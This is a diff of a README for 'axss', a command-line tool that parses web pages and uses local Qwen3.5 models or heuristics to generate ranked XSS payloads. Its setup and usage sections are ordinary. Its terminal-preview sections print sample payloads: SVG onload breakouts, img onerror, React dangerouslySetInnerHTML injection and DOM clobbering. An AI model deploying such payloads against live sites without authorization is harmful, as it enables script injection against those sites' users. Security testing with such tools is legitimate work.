@@ -2,23 +2,32 @@
 
 ![Python](https://img.shields.io/badge/python-3.10%2B-3776AB?logo=python&logoColor=white)
 ![CLI](https://img.shields.io/badge/interface-CLI-111111)
-![Ollama](https://img.shields.io/badge/Ollama-auto--install-111111?logo=ollama)
-![Model](https://img.shields.io/badge/default-Qwen3.5_9B-0F766E)
+![Ollama](https://img.shields.io/badge/Ollama-local%20runtime-111111?logo=ollama&logoColor=white)
+![Qwen3.5](https://img.shields.io/badge/Qwen3.5-4B%20%7C%209B%20%7C%2027B%20%7C%2035B-0F766E)
 
-`axss` is a context-aware XSS recon CLI that parses target HTML, detects likely DOM sinks and framework fingerprints, then generates ranked payloads with Ollama-first AI assistance and heuristic fallback.
+`axss` is a context-aware XSS recon CLI that parses target HTML, detects likely DOM sinks and framework fingerprints, then generates ranked payloads with an Ollama-first Qwen3.5 workflow plus heuristic fallback.
+
+## Why Qwen3.5
+
+Qwen3.5 is a strong default for this project because the task is not just "write an XSS string." It has to read HTML, follow JavaScript context, notice framework clues, and mutate payloads toward likely execution paths.
+
+- Better reasoning fit for multi-step DOM sink analysis and source-to-sink tracing.
+- Better coding fit for JavaScript-heavy targets, inline handlers, and framework-specific payload mutation.
+- Strong local-model range: `4b` for low-memory laptops, `9b` as the balanced default, `27b` for higher-quality reasoning, and `35b` when you have real GPU headroom.
+- Works locally through Ollama, with heuristic fallback if Ollama is unavailable and optional OpenAI fallback via `OPENAI_API_KEY`.
 
 ## Features
 
-- `-u, --url TARGET` fetches live HTML and parses forms, inputs, inline handlers, inline scripts, DOM sinks, variables, objects, and framework fingerprints.
-- `-h, --html FILE_OR_SNIPPET` parses either a local file or an inline snippet.
-- `-l, --list-models` shows local Ollama models in a table.
-- `-s, --search-models QUERY` searches for Ollama models by keyword.
-- `-m, --model MODEL` overrides the default Ollama model from `~/.axss/config.json`.
-- `-o, --output {list,json,heat}` controls terminal output.
-- `-t, --top N` limits the ranked payload count.
-- `setup.sh` auto-installs Ollama with Homebrew when needed, sizes the default Qwen3.5 model to your RAM/GPU, pulls it, creates `~/.axss/config.json`, builds the venv, and symlinks `~/.local/bin/axss`.
+- Parses a live URL with `-u, --url TARGET` or local HTML/snippets with `-h, --html FILE_OR_SNIPPET`.
+- Detects forms, inputs, inline scripts, DOM sinks, variables, objects, and framework fingerprints.
+- Uses Ollama-first generation with Qwen3.5 model overrides via `-m, --model`.
+- Lists local models with `-l, --list-models` and searches model names with `-s, --search-models QUERY`.
+- Ranks payloads in `list`, `heat`, or `json` output modes.
+- Ships with `setup.sh`, which auto-selects a Qwen3.5 tier, pulls it, creates `~/.axss/config.json`, builds the venv, and symlinks `~/.local/bin/axss`.
 
 ## Setup
+
+### Fast path
 
 ```bash
 ./setup.sh
@@ -27,28 +36,54 @@ axss --help
 
 `setup.sh` does all of the following:
 
-- installs `ollama` via `brew install ollama` if it is missing
-- detects memory with `free -h` when available and GPU memory with `nvidia-smi`
-- picks a default Qwen3.5 tier:
-  - less than 8 GB RAM: `qwen3.5:4b`
-  - 8 GB to under 32 GB RAM: `qwen3.5:9b`
-  - 32 GB+ RAM: `qwen3.5:27b`
-  - 24 GB+ NVIDIA GPU: `qwen3.5:35b`
-- starts `ollama serve` if needed and pulls the selected model
-- creates `~/.axss/config.json` with `default_model`
-- creates or refreshes `venv`, installs `requirements.txt`, marks scripts executable, and symlinks `~/.local/bin/axss`
+- Installs Ollama automatically on Homebrew-based systems when `ollama` is missing.
+- Detects RAM and NVIDIA VRAM, then selects a Qwen3.5 tier.
+- Starts `ollama serve` if needed and runs `ollama pull` for the selected model.
+- Writes `~/.axss/config.json` with `default_model`.
+- Creates or refreshes `venv`, installs `requirements.txt`, and symlinks `axss` to `~/.local/bin/axss`.
 
-If `~/.local/bin` is not already on your `PATH`, add this to your shell profile:
+### Manual Ollama setup
 
-```bash
-export PATH="$HOME/.local/bin:$PATH"
-```
+If you want to control the install yourself:
 
-The generated config looks like:
+1. Install Ollama.
 
 ```bash
-cat ~/.axss/config.json
+# macOS with Homebrew
+brew install ollama
+
+# then start the local runtime
+ollama serve
 ```
+
+If you are not using Homebrew, install Ollama with the official package for your OS first, then start `ollama serve`.
+
+2. Pull the Qwen3.5 size that matches your machine.
+
+```bash
+# low-memory / smallest local footprint
+ollama pull qwen3.5:4b
+
+# standard default for most systems
+ollama pull qwen3.5:9b
+
+# higher quality if you have 32 GB+ RAM
+ollama pull qwen3.5:27b
+
+# highest tier here, intended for systems with 24 GB+ NVIDIA VRAM
+ollama pull qwen3.5:35b
+```
+
+Sizing guidance used by `setup.sh`:
+
+| Tier | Model | Recommended hardware |
+| --- | --- | --- |
+| Low | `qwen3.5:4b` | Less than 8 GB RAM |
+| Standard | `qwen3.5:9b` | 8 GB to under 32 GB RAM |
+| High | `qwen3.5:27b` | 32 GB+ RAM |
+| GPU high | `qwen3.5:35b` | 24 GB+ NVIDIA VRAM |
+
+3. Create `~/.axss/config.json`.
 
 ```json
 {
@@ -56,34 +91,118 @@ cat ~/.axss/config.json
 }
 ```
 
-## Run
+4. Install the CLI locally.
+
+```bash
+python3 -m venv venv
+source venv/bin/activate
+python -m pip install --upgrade pip
+python -m pip install -r requirements.txt
+./axss --help
+```
+
+If `~/.local/bin` is not on your `PATH`, add:
+
+```bash
+export PATH="$HOME/.local/bin:$PATH"
+```
+
+## Usage
+
+### Common examples
+
+List local Ollama models:
 
 ```bash
 axss -l
-axss -s qwen3.5
-axss -h sample_target.html -o list -t 10
-axss -h '<div onclick="{{user}}"></div><script>eval(location.hash.slice(1))</script>' -o heat
-axss -u https://example.com -o json --json-out result.json
-axss -u https://example.com -m qwen3.5:4b -t 5 -o list
-./demo_top5.sh
 ```
 
-## Demo
+Search for Qwen3.5 tags available through your Ollama setup:
 
-Run `./demo_top5.sh` for a quick top-5 payload demo against the public target, with a fallback to `sample_target.html` if the fetch fails.
+```bash
+axss -s qwen3.5
+```
 
-## Model Notes
+Scan the included sample target and print the top payloads:
 
-- Local first: the CLI uses `~/.axss/config.json` for `default_model`, then falls back to `qwen3.5:9b`.
-- The supported Qwen3.5 sizes are `qwen3.5:4b`, `qwen3.5:9b`, `qwen3.5:27b`, and `qwen3.5:35b`.
-- Performance guidance: `4b` is the lightest and fastest, `9b` is the balanced default, `27b` improves payload quality when you have 32 GB+ RAM, and `35b` is intended for systems with 24 GB+ NVIDIA VRAM.
-- `axss -l` runs `ollama list` and formats the result as a table.
-- `axss -s qwen3.5` prefers `ollama search qwen3.5` and falls back to Ollama's web search if the installed CLI does not support `search`.
-- OpenAI fallback: set `OPENAI_API_KEY` to enable `gpt-4o-mini` fallback.
-- Without optional packages such as `beautifulsoup4` or `esprima`, the CLI still runs with stdlib parsing and heuristic generation.
+```bash
+axss -h sample_target.html -o list -t 10
+```
+
+Probe an inline HTML snippet and render the heat view:
+
+```bash
+axss -h '<div onclick="{{user}}"></div><script>eval(location.hash.slice(1))</script>' -o heat
+```
+
+Fetch a live target and write the full JSON result to disk:
+
+```bash
+axss -u https://example.com -m qwen3.5:9b -o json --json-out result.json
+```
+
+Force the smaller Qwen3.5 model when you want lower memory usage:
+
+```bash
+axss -u https://example.com -m qwen3.5:4b -o list -t 5
+```
+
+Run the bundled demo:
+
+```bash
+./demo_top5.sh
+```
 
 ## Output Modes
 
 - `list`: ranked table with payload, tags, and rationale.
 - `heat`: compact risk heat view.
-- `json`: full structured output.
+- `json`: full structured output, suitable for automation or post-processing.
+
+## Terminal Preview
+
+Sample run against `sample_target.html`:
+
+```text
+$ ./axss -h sample_target.html -o heat -t 8
+Target: file:sample_target.html (html) | engine=heuristic | model=qwen3.5:9b | fallback=True
+title=XSS Demo Target | frameworks=React | forms=1 | inputs=3 | handlers=0 | sinks=4
+notes: Parsed HTML with BeautifulSoup. Parsed scripts with esprima AST.
+# | Risk | Payload                                      | Focus                | Title
+--+------+----------------------------------------------+----------------------+-------------------------
+1 | 72   | <form id=forms><input name=innerHTML value=… | innerHTML            | DOM clobber + property …
+2 | 62   | <svg><animate onbegin=alert(1) attributeNam… | innerHTML            | innerHTML SVG animate
+3 | 60   | {"__html":"<img src=x onerror=alert(1)>"}    | dangerouslySetInner… | React dangerouslySetInn…
+4 | 52   | "><svg/onload=alert(document.domain)>        | polyglot,attribute-… | SVG onload break-out
+5 | 52   | ';document.body.innerHTML='<img src=x onerr… | chain,innerHTML      | Script-to-DOM chain
+6 | 52   | <math><mtext><img src=x onerror=alert(1)>    | mathml,polyglot      | MathML wrapper
+7 | 52   | <svg><script>alert(1)</script>               | svg,script-tag       | SVG script block
+8 | 47   | alert?.(1)//                                 | setTimeout           | Timer string execution …
+
+ 1.  72 ##################        DOM clobber + property si… <form id=forms><input name=innerHTM…
+ 2.  62 ################          innerHTML SVG animate      <svg><animate onbegin=alert(1) attr…
+ 3.  60 ###############           React dangerouslySetInner… {"__html":"<img src=x onerror=alert…
+ 4.  52 #############             SVG onload break-out       "><svg/onload=alert(document.domain…
+ 5.  52 #############             Script-to-DOM chain        ';document.body.innerHTML='<img src…
+```
+
+### Payload table preview
+
+```text
++----+------+----------------------------------------------+------------------------------+
+| #  | Risk | Payload                                      | Tags                         |
++----+------+----------------------------------------------+------------------------------+
+| 1  | 72   | <form id=forms><input name=innerHTML value=… | dom-clobber, chain, innerHTML|
+| 2  | 62   | <svg><animate onbegin=alert(1) attributeNam… | innerHTML, svg, animate      |
+| 3  | 60   | {"__html":"<img src=x onerror=alert(1)>"}    | react, dangerouslySetInner…  |
+| 4  | 52   | "><svg/onload=alert(document.domain)>        | polyglot, attribute-breakout |
++----+------+----------------------------------------------+------------------------------+
+```
+
+## Model Notes
+
+- The default model comes from `~/.axss/config.json`; if that file is missing, `axss` falls back to `qwen3.5:9b`.
+- Supported Qwen3.5 sizes in this project are `qwen3.5:4b`, `qwen3.5:9b`, `qwen3.5:27b`, and `qwen3.5:35b`.
+- `axss -l` wraps `ollama list` and formats the results as a table.
+- `axss -s qwen3.5` prefers `ollama search qwen3.5` and falls back to Ollama web search if the installed CLI does not support local search.
+- Without Ollama, the CLI still runs with heuristic generation. If `OPENAI_API_KEY` is set, it can also use `gpt-4o-mini` as a fallback path.
